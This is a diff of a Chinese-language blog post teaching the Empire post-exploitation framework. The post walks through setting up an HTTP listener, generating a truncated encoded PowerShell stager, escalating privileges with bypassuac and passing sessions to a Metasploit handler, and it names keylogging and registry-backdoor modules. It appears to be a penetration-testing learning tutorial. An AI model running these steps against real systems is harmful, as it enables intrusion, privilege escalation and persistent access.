@@ -3,13 +3,13 @@
   <head>
     <meta charset="utf-8" >
 
-<title>渗透利器之Empire--帝国 | Mari0er&#39;s Blog -</title>
+<title>渗透利器之Empire--帝国 | Mari0er&#39;s Blog</title>
 <meta name="description" content="">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1565688135525">
+<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1565699410997">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://mari0er.github.io/styles/main.css">
 
@@ -30,8 +30,8 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://mari0er.github.io">
-        <img src="https://mari0er.github.io/images/avatar.png?v=1565688135525" class="site-logo">
-        <h1 class="site-title">Mari0er&#39;s Blog -</h1>
+        <img src="https://mari0er.github.io/images/avatar.png?v=1565699410997" class="site-logo">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
         <div class="line"></div>
@@ -101,8 +101,9 @@
             <div class="post-content">
               <p>  很多人可能对Metasploit(以下简称MSF)并不陌生，但是却很少有人知道Empire，其实Empire也是渗透中的一大利器！</p>
 <!-- more -->
-<p>  Empire具体的操作流程和MSF很像，只不过完成同样的操作，命令可能会有所不同。Empire下载地址请点击<a href="https://github.com/EmpireProject/Empire">这里</a>,下载完后安装即可使用。<strong>注意</strong>:安装出错时，可以先运行 ./reset.sh命令,之后再运行 ./install.sh命令进行安装。<br>
-　　打开empire的界面如下，是不是感觉很高大上！这里对比MSF解释一下参数的意义:</p>
+<p>  Empire具体的操作流程和MSF很像，只不过完成同样的操作，命令可能会有所不同。Empire下载地址请点击<a href="https://github.com/EmpireProject/Empire">这里</a>,下载完后安装即可使用。<br>
+<strong>注意</strong>:安装出错时，可以先运行 ./reset.sh命令,之后再运行 ./install.sh命令进行安装。<br>
+打开empire的界面如下，是不是感觉很高大上！这里对比MSF解释一下参数的意义:</p>
 <blockquote>
 <p><strong>modules:</strong> 获得回话后可利用的模块，版本不同可利用的模块数可能不同<br>
 <strong>listeners:</strong> 相当于MSF中的handler，用于目标回连至Empire<br>
@@ -111,7 +112,8 @@
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/mari0er/picture/master/0303/0301_empire.png" alt=""></p>
 <h2 id="0x01">0x01</h2>
-<p>  下面，我们来学习一下Empire的使用方法。首先，我们需要创建一个监听listeners,当前版本一共有7种回连方式，这里我们选择http方式，输入info可以看到详细信息，在这里可以修改绑定的IP和端口等信息，最后输入execute即可创建listener。注意：创建好listeners后，默认会一直存在Empire中，此时可以输入kill + http来关闭监听的listeners。</p>
+<p>  下面，我们来学习一下Empire的使用方法。首先，我们需要创建一个监听listeners,当前版本一共有7种回连方式，这里我们选择http方式，输入info可以看到详细信息，在这里可以修改绑定的IP和端口等信息，最后输入execute即可创建listener。<br>
+<strong>注意：</strong> 创建好listeners后，默认会一直存在Empire中，此时可以输入kill + http来关闭监听的listeners。</p>
 <pre><code>(Empire) &gt; listeners
 (Empire: listeners) &gt; uselistener http
 (Empire: listeners/http) &gt; info
@@ -126,7 +128,7 @@
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/mari0er/picture/master/0303/0302_listeners.png" alt="listeners"></p>
 <h2 id="0x02">0x02</h2>
-<p>  创建好listeners后，我们需要攻击载荷才能对目标发起攻击。输入back命令返回上一级,输入usestager命令可以看到很多针对Windows和OSX的攻击载荷，比如常用的hta，dll，vbs等。除此之外，还可以直接利用launcher命令来生成攻击载荷(好像只支持powershell和python)，这里以powershell为例，执行完下述代码后即可生成一串攻击代码。如果是使用其他载荷，同样是设置完毕后输入execute即可生成相应的代码或者脚本文件。</p>
+<p>  创建好listeners后，我们需要攻击载荷才能对目标发起攻击。输入back命令返回上一级,输入usestager命令可以看到很多针对Windows和OSX的攻击载荷，比如常用的hta，dll，vbs等。除此之外，还可以直接利用launcher命令来生成攻击载荷，这里以powershell为例，执行完下述代码后即可生成一串攻击代码。如果是使用其他载荷，同样是设置完毕后输入execute即可生成相应的代码或者脚本文件。</p>
 <pre><code>(Empire: listeners/http) &gt; back
 (Empire: listeners) &gt; launcher powershell http
 powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAcwBpAE8ATgBUAGEAQgBsAGU......
@@ -144,7 +146,7 @@ powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAcwBpAE8ATgBUAGEAQgBsAGU.
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/mari0er/picture/master/0303/0304.png" alt=""></p>
 <h2 id="0x04">0x04</h2>
-<p>  在我们拿到shell后，第一件事应该就是提权，不然很多模块和命令都用不了。Empire的提权非常简单，直接输入bypassuac+linsteners即可。提权成功后可以看到一条新的回连信息，再次输入agents可以看到两台上线主机。注意，此时带星号标记的表示提权后的shell，不管shell处于失效或有效状态都会存在Empire中，此时可以输入remove + Name来关闭失效的shell。</p>
+<p>  在我们拿到shell后，第一件事应该就是提权，不然很多模块和命令都用不了。Empire的提权非常简单，直接输入<strong>bypassuac+linsteners</strong>即可。提权成功后可以看到一条新的回连信息，再次输入agents可以看到两台上线主机。注意，此时带星号标记的表示提权后的shell，不管shell处于失效或有效状态都会存在Empire中，此时可以输入remove + name来关闭失效的shell。</p>
 <pre><code>(Empire: mari0er) &gt; bypassuac http
 Empire: mari0er) &gt; 
 Job started: 6TZBXY
@@ -177,7 +179,7 @@ msf exploit(multi/handler) &gt; exploit
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/mari0er/picture/master/0303/0309.png" alt=""></p>
 <h2 id="0x6">0x6</h2>
-<p>  其实Empire还有很多模块可以利用，比如键盘记录，屏幕截图，添加注册表后门，查看域主机和共享服务等，这里只是记录一下我学习的一部分，待以后再慢慢去研究更加深层的玩法。</p>
+<p>  其实Empire还有很多模块可以利用，比如键盘记录，屏幕截图，添加注册表后门，查看域主机和共享服务等，这里只是记录一下我学习的一部分，待以后再慢慢去研究更加好玩的玩法。</p>
 <blockquote>
 <p>本文作者： Mari0er<br>
 本文链接： https://mari0er.github.io/post/empire.html<br>
@@ -207,7 +209,7 @@ msf exploit(multi/handler) &gt; exploit
                 <div class="next">下一篇</div>
                 <a href="https://mari0er.github.io/post/nethunter.html">
                   <h3 class="post-title">
-                    打造一台&#34;黑客&#34;手机--Nethunter
+                    快速打造一台&#34;黑客&#34;手机--Nethunter
                   </h3>
                 </a>
               </div>
